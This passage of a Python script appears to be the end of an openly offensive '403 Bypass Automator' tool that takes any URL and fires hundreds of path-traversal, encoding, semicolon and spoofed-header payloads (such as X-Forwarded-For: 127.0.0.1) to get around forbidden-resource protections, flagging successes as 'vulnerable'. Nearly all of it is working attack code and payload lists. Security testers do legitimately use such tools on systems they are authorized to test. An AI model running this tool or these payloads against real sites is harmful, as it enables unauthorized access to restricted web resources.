            (';%2f../%2f..%2f', 'Semicolon encoded traversal encoded'),
            (';%2f../%2f../', 'Semicolon encoded double traversal'),
            (';%2f..//..%2f', 'Semicolon encoded traversal double slash'),
            (';%2f..//../', 'Semicolon encoded traversal double slash traversal'),
            (';%2f..///', 'Semicolon encoded traversal triple slash'),
            (';%2f..///;', 'Semicolon encoded traversal triple slash semicolon'),
            (';%2f..//;/', 'Semicolon encoded traversal double slash semicolon'),
            (';%2f..//;/;', 'Semicolon encoded complex'),
            (';%2f../;//', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f../;/;/', 'Semicolon encoded traversal semicolons'),
            (';%2f../;/;/;', 'Semicolon encoded traversal multiple semicolons'),
            (';%2f..;///', 'Semicolon encoded traversal semicolon triple slash'),
            (';%2f..;//;/', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f..;/;//', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f/%2f../', 'Semicolon encoded slash encoded traversal'),
            (';%2f//..%2f', 'Semicolon encoded double slash traversal'),
            (';%2f//../', 'Semicolon encoded double slash traversal'),
            (';%2f//..;/', 'Semicolon encoded double slash traversal semicolon'),
            (';%2f/;/../', 'Semicolon encoded slash semicolon traversal'),
            (';%2f/;/..;/', 'Semicolon encoded slash semicolon complex'),
            (';%2f;//../', 'Semicolon encoded semicolon double slash traversal'),
            (';%2f;/;/..;/', 'Semicolon encoded semicolon complex'),
            (';/%2e%2e', 'Semicolon encoded dots'),
            (';/%2e%2e%2f%2f', 'Semicolon encoded dots double slash'),
            (';/%2e%2e%2f/', 'Semicolon encoded dots slash'),
            (';/%2e%2e/', 'Semicolon encoded dots with slash'),
            (';/%2e.', 'Semicolon encoded dot'),
            (';/%2f%2f../', 'Semicolon encoded double slash traversal'),
            (';/%2f/..%2f', 'Semicolon encoded slash traversal encoded'),
            (';/%2f/../', 'Semicolon encoded slash traversal'),
            (';/.%2e', 'Semicolon current encoded dot'),
            (';/.%2e/%2e%2e/%2f', 'Semicolon complex encoded traversal'),
            (';/..', 'Semicolon path traversal'),
            (';/..%2f', 'Semicolon encoded path traversal'),
            (';/..%2f%2f../', 'Semicolon encoded traversal double slash'),
            (';/..%2f..%2f', 'Semicolon encoded double traversal'),
            (';/..%2f/', 'Semicolon encoded traversal slash'),
            (';/..%2f//', 'Semicolon encoded traversal double slash'),
            (';/../', 'Semicolon path traversal slash'),
            (';/../%2f/', 'Semicolon traversal encoded slash'),
            (';/../../', 'Semicolon double traversal'),
            (';/../..//', 'Semicolon double traversal double slash'),
            (';/.././../', 'Semicolon traversal current traversal'),
            (';/../.;/../', 'Semicolon traversal encoded current'),
            (';/..//', 'Semicolon traversal double slash'),
            (';/..//%2e%2e/', 'Semicolon traversal double slash encoded'),
            (';/..//%2f', 'Semicolon traversal double slash encoded'),
            (';/..//../', 'Semicolon traversal double slash traversal'),
            (';/..///', 'Semicolon traversal triple slash'),
            (';/../;/', 'Semicolon traversal semicolon'),
            (';/../;/../', 'Semicolon traversal semicolon traversal'),
            (';/..;', 'Semicolon traversal semicolon'),
            (';/.;.', 'Semicolon current dot'),
            (';//%2f../', 'Semicolon double slash encoded traversal'),
            (';//..', 'Semicolon double slash traversal'),
            (';//../../', 'Semicolon double slash double traversal'),
            (';///..', 'Semicolon triple slash traversal'),
            (';///../', 'Semicolon triple slash traversal slash'),
            (';///..//', 'Semicolon triple slash traversal double slash'),
            (';///..;', 'Semicolon triple slash traversal semicolon'),
            (';///..;/', 'Semicolon triple slash traversal semicolon slash'),
            (';///..;//', 'Semicolon triple slash complex'),
            (';x', 'Semicolon x'),
            (';x/', 'Semicolon x slash'),
            (';x;', 'Semicolon x semicolon'),
            # Other characters
            ('&', 'Ampersand'),
            ('%', 'Percent'),
            ('??', 'Double question'),
            ('???', 'Triple question'),
            ('//', 'Double slash'),
            ('/./', 'Current dir'),
            ('.//./', 'Complex current dir'),
            ('//?anything', 'Double slash question'),
            ('#', 'Hash'),
            ('/', 'Trailing slash'),
            ('/.randomstring', 'Random string'),
            ('..;/', 'Dots semicolon slash'),
            ('.html', 'HTML extension'),
            ('%20/', 'Space slash'),
            ('.json', 'JSON extension'),
            ('/*', 'Wildcard'),
            ('./.', 'Current dir dot'),
            ('/*/', 'Wildcard slash'),
            ('\..\.\\', 'Backslash dots backslash'),
        ]
        
        for payload, description in extended_encoding:
            test_url = self.url + payload
            status, size = self.test_request(test_url, description=description)
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'extended-encoding', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'extended-encoding', payload))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'extended-encoding', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'extended-encoding', payload))
            time.sleep(3)
    
    def test_header_path_combination_bypasses(self):
        """Test combinations of headers + path manipulation (like X-Custom-IP-Authorization with ..;/)"""
        path = self.get_path_from_url()
        parsed = urlparse(self.url)
        
        # Headers that work well with path manipulation
        special_headers = [
            ('X-Custom-IP-Authorization', '127.0.0.1'),
            ('X-Forwarded-For', '127.0.0.1'),
            ('X-Originating-IP', '127.0.0.1'),
            ('X-Real-IP', '127.0.0.1'),
        ]
        
        # Path manipulation payloads to combine with headers
        path_payloads = [
            ('..;/', 'Dots semicolon slash'),
            ('..;', 'Dots semicolon'),
            ('/..;/', 'Path traversal semicolon'),
            ('..%2F', 'Encoded path traversal'),
            ('%2e%2e%2f', 'Encoded dots slash'),
        ]
        
        for header_name, header_value in special_headers:
            for path_payload, path_desc in path_payloads:
                test_url = self.url + path_payload
                headers = {header_name: header_value}
                status, size = self.test_request(test_url, headers=headers, description=f'Header {header_name} + {path_desc}')
                
                if status:
                    if status == 200:
                        self.print_nuclei_style('403-bypass', 'vulnerable', test_url, f'Header {header_name} + {path_desc}', status, size, {'technique': 'header-path-combo', 'header': f'{header_name}: {header_value}', 'path': path_payload})
                        self.successful_bypasses.append((test_url, f'Header {header_name} + {path_desc}', status, size, 'header-path-combo', f'{header_name}+{path_payload}'))
                    elif status != 403 and status != self.original_status:
                        self.print_nuclei_style('403-bypass', 'high', test_url, f'Header {header_name} + {path_desc} - Different status', status, size, {'technique': 'header-path-combo', 'header': f'{header_name}: {header_value}', 'path': path_payload})
                        self.successful_bypasses.append((test_url, f'Header {header_name} + {path_desc}', status, size, 'header-path-combo', f'{header_name}+{path_payload}'))
                time.sleep(3)
    
    def test_additional_path_payloads(self):
        """Test additional path payloads from bash script that might be missing"""
        path = self.get_path_from_url()
        parsed = urlparse(self.url)
        domain = parsed.netloc
        
        # Additional payloads that might work
        additional_payloads = [
            # Path with space and path in middle (from bash: %20${path}%20/)
            (f'/%20{path.lstrip("/")}%20/', 'Path with encoded spaces'),
            # Path with %2e at start
            (f'/%2e/{path.lstrip("/")}', 'Encoded dot before path'),
            # Multiple variations
            ('//.', 'Double slash dot'),
            ('//.;/', 'Double slash dot semicolon'),
            # More semicolon variations
            (';%2f..%2f..%2f%2f', 'Semicolon encoded triple traversal'),
            (';%2f..%2f/..%2f', 'Semicolon encoded traversal encoded'),
            (';%2f..%2f/../', 'Semicolon encoded traversal'),
            (';%2f../%2f..%2f', 'Semicolon encoded traversal encoded'),
            (';%2f../%2f../', 'Semicolon encoded double traversal'),
            (';%2f..//..%2f', 'Semicolon encoded traversal double slash encoded'),
            (';%2f..//../', 'Semicolon encoded traversal double slash'),
            (';%2f..///', 'Semicolon encoded traversal triple slash'),
            (';%2f..///;', 'Semicolon encoded traversal triple slash semicolon'),
            (';%2f..//;/', 'Semicolon encoded traversal double slash semicolon'),
            (';%2f..//;/;', 'Semicolon encoded complex'),
            (';%2f../;//', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f../;/;/', 'Semicolon encoded traversal semicolons'),
            (';%2f../;/;/;', 'Semicolon encoded traversal multiple semicolons'),
            (';%2f..;///', 'Semicolon encoded traversal semicolon triple slash'),
            (';%2f..;//;/', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f..;/;//', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f/%2f../', 'Semicolon encoded slash encoded traversal'),
            (';%2f//..%2f', 'Semicolon encoded double slash traversal encoded'),
            (';%2f//../', 'Semicolon encoded double slash traversal'),
            (';%2f//..;/', 'Semicolon encoded double slash traversal semicolon'),
            (';%2f/;/../', 'Semicolon encoded slash semicolon traversal'),
            (';%2f/;/..;/', 'Semicolon encoded slash semicolon complex'),
            (';%2f;//../', 'Semicolon encoded semicolon double slash traversal'),
            (';%2f;/;/..;/', 'Semicolon encoded semicolon complex'),
        ]
        
        for payload, description in additional_payloads:
            # Skip if payload already contains full path (to avoid duplication)
            if path.lstrip("/") in payload and payload.startswith('/%20'):
                test_url = f"{parsed.scheme}://{parsed.netloc}{payload}"
            else:
                test_url = self.url + payload
            
            status, size = self.test_request(test_url, description=description)
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'additional-path', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'additional-path', payload))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'additional-path', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'additional-path', payload))
            time.sleep(3)
    
    def test_endpath_bypasses(self):
        """Test endpath payloads - payloads added at the end of the path"""
        endpath_payloads = [
            # Basic
            ('?', 'Question mark'),
            ('??', 'Double question'),
            ('/', 'Trailing slash'),
            ('//', 'Double slash'),
            ('/.', 'Dot'),
            ('/./', 'Current dir'),
            ('/..;/', 'Path traversal semicolon'),
            # Encoded
            ('%00', 'Null byte'),
            ('%09', 'Tab'),
            ('%0A', 'Line feed'),
            ('%0D', 'Carriage return'),
            ('%20', 'Space'),
            ('%20/', 'Space slash'),
            ('%25', 'Percent'),
            ('%23', 'Hash'),
            ('%26', 'Ampersand'),
            ('%3f', 'Question'),
            ('%61', 'Letter a'),
            # Double encoded
            ('%2500', 'Double encoded null'),
            ('%2509', 'Double encoded tab'),
            ('%250A', 'Double encoded line feed'),
            ('%250D', 'Double encoded carriage return'),
            ('%2520', 'Double encoded space'),
            ('%2520%252F', 'Double encoded space slash'),
            ('%2525', 'Double encoded percent'),
            ('%2523', 'Double encoded hash'),
            ('%2526', 'Double encoded ampersand'),
            ('%253F', 'Double encoded question'),
            ('%2561', 'Double encoded letter a'),
            # Special
            ('&', 'Ampersand'),
            ('-', 'Dash'),
            ('.', 'Dot'),
            ('..;', 'Dots semicolon'),
            ('..\;', 'Dots backslash'),
            ('..;/', 'Dots semicolon slash'),
            ('~', 'Tilde'),
            ('°/', 'Degree slash'),
            # Extensions
            ('.css', 'CSS extension'),
            ('.html', 'HTML extension'),
            ('.json', 'JSON extension'),
            ('.php', 'PHP extension'),
            ('.random', 'Random extension'),
            ('.svc', 'SVC extension'),
            ('.svc?wsdl', 'SVC WSDL'),
            ('.wsdl', 'WSDL extension'),
            # Query
            ('?WSDL', 'WSDL query'),
            ('?debug=1', 'Debug query 1'),
            ('?debug=true', 'Debug query true'),
            ('?param', 'Param query'),
            ('?testparam', 'Test param query'),
            # Special paths
            ('\/\/', 'Escaped slashes'),
            ('debug', 'Debug'),
            ('false', 'False'),
            ('null', 'Null'),
            ('true', 'True'),
            ('/*', 'Wildcard'),
            ('0', 'Zero'),
            ('1', 'One'),
            ('#', 'Hash'),
            ('#/', 'Hash slash'),
            ('#/.', 'Hash dot'),
            ('#test', 'Hash test'),
        ]
        
        for payload, description in endpath_payloads:
            test_url = self.url + payload
            status, size = self.test_request(test_url, description=f'Endpath: {description}')
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', test_url, f'Endpath: {description}', status, size, {'technique': 'endpath', 'payload': payload})
                    self.successful_bypasses.append((test_url, f'Endpath: {description}', status, size, 'endpath', payload))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', test_url, f'Endpath: {description} - Different status', status, size, {'technique': 'endpath', 'payload': payload})
                    self.successful_bypasses.append((test_url, f'Endpath: {description}', status, size, 'endpath', payload))
            time.sleep(3)
    
    def test_midpath_bypasses(self):
        """Test midpath payloads - payloads inserted in the middle of the path"""
        path = self.get_path_from_url()
        parsed = urlparse(self.url)
        path_segments = [s for s in path.strip('/').split('/') if s]
        
        if len(path_segments) < 2:
            return  # Need at least 2 segments to insert in middle
        
        midpath_payloads = [
            # Basic
            ('#', 'Hash'),
            ('#?', 'Hash question'),
            ('%', 'Percent'),
            # Encoded
            ('%09', 'Tab'),
            ('%09%3b', 'Tab semicolon'),
            ('%09..', 'Tab dots'),
            ('%09;', 'Tab semicolon'),
            ('%20', 'Space'),
            ('%20/', 'Space slash'),
            ('%23', 'Hash encoded'),
            ('%23%3f', 'Hash question encoded'),
            ('%252f%252f', 'Double encoded slashes'),
            ('%252f/', 'Double encoded slash'),
            ('%26', 'Ampersand encoded'),
            ('%2e', 'Dot encoded'),
            ('%2e%2e', 'Dots encoded'),
            ('%2e%2e%2f', 'Dots slash encoded'),
            ('%2e%2e/', 'Dots slash'),
            ('%2e/', 'Dot slash'),
            ('%2f', 'Slash encoded'),
            ('%2f%20%23', 'Slash space hash'),
            ('%2f%23', 'Slash hash'),
            ('%2f%2f', 'Double slash encoded'),
            ('%2f%3b%2f', 'Slash semicolon slash'),
            ('%2f%3b%2f%2f', 'Slash semicolon double slash'),
            ('%2f%3f', 'Slash question'),
            ('%2f%3f/', 'Slash question slash'),
            ('%2f/', 'Slash encoded with slash'),
            ('%3b', 'Semicolon encoded'),
            ('%3b%09', 'Semicolon tab'),
            ('%3b%2f%2e%2e', 'Semicolon encoded dots'),
            ('%3b%2f%2e%2e%2f%2e%2e%2f%2f', 'Complex semicolon encoded'),
            ('%3b%2f%2e.', 'Semicolon encoded dot'),
            ('%3b%2f..', 'Semicolon encoded dots'),
            ('%3b/%2e%2e/..%2f%2f', 'Complex semicolon traversal'),
            ('%3b/%2e.', 'Semicolon encoded dot'),
            ('%3b/%2f%2f../', 'Semicolon encoded double slash'),
            ('%3b/..', 'Semicolon traversal'),
            ('%3b//%2f../', 'Semicolon double encoded slash'),
            ('%3f', 'Question encoded'),
            ('%3f%23', 'Question hash'),
            ('%3f%3f', 'Double question encoded'),
            # Special characters
            ('&', 'Ampersand'),
            ('.%2e/', 'Dot encoded slash'),
            ('..', 'Dots'),
            ('..%00/', 'Dots null byte'),
            ('..%00/;', 'Dots null byte semicolon'),
            ('..%00;/', 'Dots null byte semicolon slash'),
            ('..%09', 'Dots tab'),
            ('..%0d/', 'Dots carriage return'),
            ('..%0d/;', 'Dots carriage return semicolon'),
            ('..%0d;/', 'Dots carriage return semicolon slash'),
            ('..%2f', 'Dots slash encoded'),
            ('..%3B', 'Dots semicolon encoded'),
            ('..%5c', 'Dots backslash encoded'),
            ('..%5c/', 'Dots backslash encoded slash'),
            ('..%ff', 'Dots FF byte'),
            ('..%ff/;', 'Dots FF byte semicolon'),
            ('..%ff;/', 'Dots FF byte semicolon slash'),
            ('../', 'Dots slash'),
            ('.././', 'Dots current'),
            ('..;', 'Dots semicolon'),
            ('..;%00/', 'Dots semicolon null byte'),
            ('..;%0d/', 'Dots semicolon carriage return'),
            ('..;%ff/', 'Dots semicolon FF byte'),
            ('..;/', 'Dots semicolon slash'),
            ('..;\;', 'Dots semicolon backslash'),
            ('..;\\', 'Dots semicolon backslash'),
            ('..\;', 'Dots backslash'),
            ('..\\', 'Dots backslash'),
            ('./', 'Current slash'),
            ('./.', 'Current dot'),
            ('.//./', 'Complex current'),
            ('.;/', 'Current semicolon'),
            ('.\;/', 'Current backslash semicolon'),
            ('.html', 'HTML extension'),
            ('.json', 'JSON extension'),
            # Path variations
            ('/', 'Slash'),
            ('/%20#', 'Space hash'),
            ('/%20%20/', 'Double space'),
            ('/%20%23', 'Space hash encoded'),
            ('/%252e%252e%252f/', 'Triple encoded dots slash'),
            ('/%252e%252e%253b/', 'Triple encoded dots semicolon'),
            ('/%252e%252f/', 'Triple encoded dot slash'),
            ('/%252e%253b/', 'Triple encoded dot semicolon'),
            ('/%252e/', 'Triple encoded dot'),
            ('/%252f', 'Triple encoded slash'),
            ('/%2e%2e', 'Encoded dots'),
            ('/%2e%2e%3b/', 'Encoded dots semicolon'),
            ('/%2e%2e/', 'Encoded dots slash'),
            ('/%2e%2f/', 'Encoded dot slash'),
            ('/%2e%3b/', 'Encoded dot semicolon'),
            ('/%2e%3b//', 'Encoded dot semicolon double slash'),
            ('/%2e/', 'Encoded dot'),
            ('/%2e//', 'Encoded dot double slash'),
            ('/%2f', 'Encoded slash'),
            ('/%3b/', 'Encoded semicolon'),
            ('/*', 'Wildcard'),
            ('/*/', 'Wildcard slash'),
            ('/.', 'Dot'),
            ('/..', 'Dots'),
            ('/..%2f', 'Encoded dots slash'),
            ('/..%2f..%2f', 'Double encoded traversal'),
            ('/..%2f..%2f..%2f', 'Triple encoded traversal'),
            ('/../', 'Traversal slash'),
            ('/../../', 'Double traversal'),
            ('/../../../', 'Triple traversal'),
            ('/../../..//', 'Triple traversal double slash'),
            ('/../..//', 'Double traversal double slash'),
            ('/../..//../', 'Complex traversal'),
            ('/../..;/', 'Double traversal semicolon'),
            ('/.././../', 'Traversal current traversal'),
            ('/../.;/../', 'Traversal encoded current'),
            ('/..//', 'Traversal double slash'),
            ('/..//../', 'Traversal double slash traversal'),
            ('/..//../../', 'Complex traversal'),
            ('/..//..;/', 'Traversal double slash semicolon'),
            ('/../;/', 'Traversal semicolon'),
            ('/../;/../', 'Double traversal semicolon'),
            ('/..;%2f', 'Traversal semicolon encoded'),
            ('/..;%2f..;%2f', 'Double traversal semicolon encoded'),
            ('/..;%2f..;%2f..;%2f', 'Triple traversal semicolon encoded'),
            ('/..;/../', 'Traversal semicolon traversal'),
            ('/..;/..;/', 'Double traversal semicolon'),
            ('/..;//', 'Traversal semicolon double slash'),
            ('/..;//../', 'Traversal semicolon double slash traversal'),
            ('/..;//..;/', 'Complex traversal semicolon'),
            ('/..;/;/', 'Traversal semicolon semicolon'),
            ('/..;/;/..;/', 'Complex traversal semicolons'),
            ('/.//', 'Current double slash'),
            ('/.;/', 'Current semicolon'),
            ('/.;//', 'Current semicolon double slash'),
            ('/.randomstring', 'Random string'),
            ('//', 'Double slash'),
            ('//.', 'Double slash dot'),
            ('//..', 'Double slash traversal'),
            ('//../../', 'Double slash double traversal'),
            ('//..;', 'Double slash traversal semicolon'),
            ('//./', 'Double slash current'),
            ('//.;/', 'Double slash current semicolon'),
            ('///..', 'Triple slash traversal'),
            ('///../', 'Triple slash traversal slash'),
            ('///..//', 'Triple slash traversal double slash'),
            ('///..;', 'Triple slash traversal semicolon'),
            ('///..;/', 'Triple slash traversal semicolon slash'),
            ('///..;//', 'Triple slash complex'),
            ('////', 'Quadruple slash'),
            ('//;/', 'Double slash semicolon'),
            ('//?anything', 'Double slash question'),
            ('/;/', 'Semicolon slash'),
            ('/;//', 'Semicolon double slash'),
            ('/;x', 'Semicolon x'),
            ('/;x/', 'Semicolon x slash'),
            ('/x/../', 'x traversal'),
            ('/x/..//', 'x traversal double slash'),
            ('/x/../;/', 'x traversal semicolon'),
            ('/x/..;/', 'x traversal semicolon'),
            ('/x/..;//', 'x complex traversal'),
            ('/x/..;/;/', 'x complex traversal semicolons'),
            ('/x//../', 'x double slash traversal'),
            ('/x//..;/', 'x double slash traversal semicolon'),
            ('/x/;/../', 'x semicolon traversal'),
            ('/x/;/..;/', 'x semicolon complex'),
            (';', 'Semicolon'),
            (';%09', 'Semicolon tab'),
            (';%09..', 'Semicolon tab dots'),
            (';%09..;', 'Semicolon tab dots semicolon'),
            (';%09;', 'Semicolon tab semicolon'),
            (';%2f%2e%2e', 'Semicolon encoded dots'),
            (';%2f%2e%2e%2f%2e%2e%2f%2f', 'Complex semicolon encoded'),
            (';%2f%2f/../', 'Semicolon encoded double slash'),
            (';%2f..', 'Semicolon encoded dots'),
            (';%2f..%2f%2e%2e%2f%2f', 'Semicolon encoded complex'),
            (';%2f..%2f..%2f%2f', 'Semicolon encoded double traversal'),
            (';%2f..%2f/', 'Semicolon encoded traversal slash'),
            (';%2f..%2f/..%2f', 'Semicolon encoded traversal encoded'),
            (';%2f..%2f/../', 'Semicolon encoded traversal'),
            (';%2f../%2f..%2f', 'Semicolon encoded traversal encoded'),
            (';%2f../%2f../', 'Semicolon encoded double traversal'),
            (';%2f..//..%2f', 'Semicolon encoded traversal double slash encoded'),
            (';%2f..//../', 'Semicolon encoded traversal double slash'),
            (';%2f..///', 'Semicolon encoded traversal triple slash'),
            (';%2f..///;', 'Semicolon encoded traversal triple slash semicolon'),
            (';%2f..//;/', 'Semicolon encoded traversal double slash semicolon'),
            (';%2f..//;/;', 'Semicolon encoded complex'),
            (';%2f../;//', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f../;/;/', 'Semicolon encoded traversal semicolons'),
            (';%2f../;/;/;', 'Semicolon encoded traversal multiple semicolons'),
            (';%2f..;///', 'Semicolon encoded traversal semicolon triple slash'),
            (';%2f..;//;/', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f..;/;//', 'Semicolon encoded traversal semicolon double slash'),
            (';%2f/%2f../', 'Semicolon encoded slash encoded traversal'),
            (';%2f//..%2f', 'Semicolon encoded double slash traversal encoded'),
            (';%2f//../', 'Semicolon encoded double slash traversal'),
            (';%2f//..;/', 'Semicolon encoded double slash traversal semicolon'),
            (';%2f/;/../', 'Semicolon encoded slash semicolon traversal'),
            (';%2f/;/..;/', 'Semicolon encoded slash semicolon complex'),
            (';%2f;//../', 'Semicolon encoded semicolon double slash traversal'),
            (';%2f;/;/..;/', 'Semicolon encoded semicolon complex'),
            (';/%2e%2e', 'Semicolon encoded dots'),
            (';/%2e%2e%2f%2f', 'Semicolon encoded dots double slash'),
            (';/%2e%2e%2f/', 'Semicolon encoded dots slash'),
            (';/%2e%2e/', 'Semicolon encoded dots with slash'),
            (';/%2e.', 'Semicolon encoded dot'),
            (';/%2f%2f../', 'Semicolon encoded double slash traversal'),
            (';/%2f/..%2f', 'Semicolon encoded slash traversal encoded'),
            (';/%2f/../', 'Semicolon encoded slash traversal'),
            (';/.%2e', 'Semicolon current encoded dot'),
            (';/.%2e/%2e%2e/%2f', 'Semicolon complex encoded traversal'),
            (';/..', 'Semicolon path traversal'),
            (';/..%2f', 'Semicolon encoded path traversal'),
            (';/..%2f%2f../', 'Semicolon encoded traversal double slash'),
            (';/..%2f..%2f', 'Semicolon encoded double traversal'),
            (';/..%2f/', 'Semicolon encoded traversal slash'),
            (';/..%2f//', 'Semicolon encoded traversal double slash'),
            (';/../', 'Semicolon path traversal slash'),
            (';/../%2f/', 'Semicolon traversal encoded slash'),
            (';/../../', 'Semicolon double traversal'),
            (';/../..//', 'Semicolon double traversal double slash'),
            (';/.././../', 'Semicolon traversal current traversal'),
            (';/../.;/../', 'Semicolon traversal encoded current'),
            (';/..//', 'Semicolon traversal double slash'),
            (';/..//%2e%2e/', 'Semicolon traversal double slash encoded'),
            (';/..//%2f', 'Semicolon traversal double slash encoded'),
            (';/..//../', 'Semicolon traversal double slash traversal'),
            (';/..///', 'Semicolon traversal triple slash'),
            (';/../;/', 'Semicolon traversal semicolon'),
            (';/../;/../', 'Semicolon traversal semicolon traversal'),
            (';/..;', 'Semicolon traversal semicolon'),
            (';/.;.', 'Semicolon current dot'),
            (';//%2f../', 'Semicolon double slash encoded traversal'),
            (';//..', 'Semicolon double slash traversal'),
            (';//../../', 'Semicolon double slash double traversal'),
            (';///..', 'Semicolon triple slash traversal'),
            (';///../', 'Semicolon triple slash traversal slash'),
            (';///..//', 'Semicolon triple slash traversal double slash'),
            (';///..;', 'Semicolon triple slash traversal semicolon'),
            (';///..;/', 'Semicolon triple slash traversal semicolon slash'),
            (';///..;//', 'Semicolon triple slash complex'),
            (';foo=bar/', 'Semicolon foo bar'),
            (';x', 'Semicolon x'),
            (';x/', 'Semicolon x slash'),
            (';x;', 'Semicolon x semicolon'),
            ('?', 'Question'),
            ('??', 'Double question'),
            ('???', 'Triple question'),
            ('\..\.\\', 'Backslash dots backslash'),
        ]
        
        # Insert payloads between segments
        for i in range(len(path_segments) - 1):
            for payload, description in midpath_payloads:
                new_segments = path_segments[:]
                new_segments.insert(i + 1, payload)
                new_path = '/' + '/'.join(new_segments)
                test_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                status, size = self.test_request(test_url, description=f'Midpath: {description} between segment {i+1} and {i+2}')
                
                if status:
                    if status == 200:
                        self.print_nuclei_style('403-bypass', 'vulnerable', test_url, f'Midpath: {description}', status, size, {'technique': 'midpath', 'payload': payload, 'position': f'between {i+1}-{i+2}'})
                        self.successful_bypasses.append((test_url, f'Midpath: {description}', status, size, 'midpath', payload))
                    elif status != 403 and status != self.original_status:
                        self.print_nuclei_style('403-bypass', 'high', test_url, f'Midpath: {description} - Different status', status, size, {'technique': 'midpath', 'payload': payload, 'position': f'between {i+1}-{i+2}'})
                        self.successful_bypasses.append((test_url, f'Midpath: {description}', status, size, 'midpath', payload))
                time.sleep(3)  # Delay to avoid blocking
    
    def run_all_tests(self):
        """Run all bypass tests"""
        print(f"{Fore.CYAN}[403-bypass]{Style.RESET_ALL} {Fore.BLUE}[INFO]{Style.RESET_ALL} Starting bypass tests for {self.url}\n")
        
        # Test original URL first
        is_403 = self.test_original()
        if not is_403:
            self.print_nuclei_style('403-bypass', 'info', self.url, 'Original request does not return 403, continuing tests anyway')
            print()
        
        # Run all tests
        self.test_url_encoding_bypasses()
        self.test_double_encoding_bypasses()
        self.test_extended_url_encoding_bypasses()
        self.test_path_manipulation_bypasses()
        self.test_path_permutation_bypasses()
        self.test_path_traversal_bypasses()
        self.test_case_variations()
        self.test_http_methods()
        self.test_bypass_headers()
        self.test_protocol_bypasses()
        self.test_port_bypasses()
        self.test_header_path_combination_bypasses()
        self.test_additional_path_payloads()
        self.test_endpath_bypasses()
        self.test_midpath_bypasses()
        
        # Summary
        print()
        if self.successful_bypasses:
            vulnerable_count = sum(1 for b in self.successful_bypasses if b[2] == 200)
            self.print_nuclei_style('403-bypass', 'info', self.url, f'Found {len(self.successful_bypasses)} bypasses ({vulnerable_count} with status 200)')
        else:
            self.print_nuclei_style('403-bypass', 'info', self.url, 'No bypasses found')
        print()

def print_banner():
    """Print tool banner"""
    banner = f"""
{Fore.CYAN}================================================================
{Fore.CYAN}
{Fore.CYAN}                    HAVE ACCESS NOW?
{Fore.CYAN}
{Fore.CYAN}        403 Bypass Automator - Test 1000+ bypass techniques
{Fore.CYAN}                    Created by d0x
{Fore.CYAN}
{Fore.CYAN}================================================================{Style.RESET_ALL}
"""
    print(banner)

def main():
    # Print banner
    print_banner()
    
    if len(sys.argv) < 2:
        print(f"{Fore.RED}Usage: python 403_bypass_automator.py <URL>{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Example: python 403_bypass_automator.py https://example.com/api/admin{Style.RESET_ALL}")
        sys.exit(1)
    
    url = sys.argv[1]
    
    # Validar que sea una URL válida
    if not url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[!] Error: URL must start with http:// or https://{Style.RESET_ALL}")
        sys.exit(1)
    
    automator = BypassAutomator(url)
    automator.run_all_tests()

if __name__ == '__main__':
    main()
